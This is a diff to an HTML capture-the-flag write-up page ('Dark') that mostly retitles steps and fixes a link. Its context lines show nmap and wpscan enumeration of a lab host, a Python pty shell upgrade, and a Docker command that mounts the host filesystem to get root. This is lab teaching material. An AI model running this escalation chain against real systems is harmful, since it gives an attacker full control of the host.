@@ -28,7 +28,7 @@
 
 <main>
   <p class="lede">guest@grehaus <span class="path">~/writeups/hack-smarter/Dark</span></p>
-  <p class="lede back">$ cd .. <a href="../">→ back to hack-smarter/</a></p>
+  <p class="lede back">$ cd .. <a href="../../">→ back to hack-smarter/</a></p>
 
   <!-- ============ INFO CARD ============ -->
   <div class="infocard difficulty-easy">
@@ -80,7 +80,7 @@
     </div>
     <div class="win-body">
 
-      <p class="row"><span class="step-num">[01]</span><span class="prompt">nmap -sC -sV -vv -oN scans/nmap_all_tcp.txt 10.1.61.224</span></p>
+      <p class="row"><span class="step-num">[01]</span><span class="prompt">Port Scan and Service Discovery</span></p>
       <div class="code-block">
 <pre><span class="cmd">nmap -sC -sV -vv -oN scans/nmap_all_tcp.txt 10.1.61.224</span>
 <span class="out">PORT   STATE SERVICE REASON         VERSION
@@ -102,7 +102,7 @@
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre>
       </div>
 
-      <p class="row"><span class="step-num">[02]</span><span class="prompt">wpscan --url http://10.1.61.224 --plugins-detection mixed -e p</span></p>
+      <p class="row"><span class="step-num">[02]</span><span class="prompt">Using wpscan to Enumerate the WordPress Site</span></p>
       <div class="code-block">
 <pre><span class="cmd">wpscan --url http://10.1.61.224 --plugins-detection mixed -e p</span>
 <span class="out">_______________________________________________________________
@@ -309,7 +309,7 @@ CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
       <p class="row"><span class="step-num">[05]</span> Privilege escalation</p>
       <p class="note">
         From the output we can see that we are able to escalate our privileges by mounting the host system. First we need to upgrade to a proper TTY using
-        <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>. Then, following the link, we simply need to run
+        <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>. Then, following the suggested link, we simply need to run
         <code>docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash</code> — and we're root.
       </p>
 
